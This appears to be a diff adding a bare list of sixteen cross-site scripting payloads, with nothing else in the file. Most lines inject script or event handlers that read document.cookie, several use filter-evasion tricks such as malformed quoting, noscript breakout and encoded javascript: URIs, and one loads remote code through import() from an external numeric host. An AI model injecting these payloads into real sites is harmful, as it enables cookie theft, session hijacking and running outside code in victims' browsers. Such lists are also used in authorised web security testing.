@@ -1,0 +1,16 @@
+"/><script>alert(document.cookie)</script>
+"/><script>confirm(document.cookie)</script>
+"/><script>prompt(document.cookie)</script>
+"/><script>print(document.cookie)</script>
+"/><img src=x onerror=alert(document.cookie)>
+"/><svg/onload=alert(1)>
+javascript:alert(1)//
+<x onauxclick=import('//1152848220/')>click
+<a”/onclick=(confirm)(document.cookie)>Click Here!
+<a”/onclick=(confirm)(document.cookie)>Click Here!
+<x onmouseover=alert(1)>hover this!
+<svg><script xlink:href=data:,alert(1) />
+<img src=1 href=1 onerror="javascript:alert(1)"></img>
+<a href="\x0Cjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<img src="/" =_=" title="onerror='prompt(1)'">
+<noscript><p title="</noscript><script>alert(1)</script>">
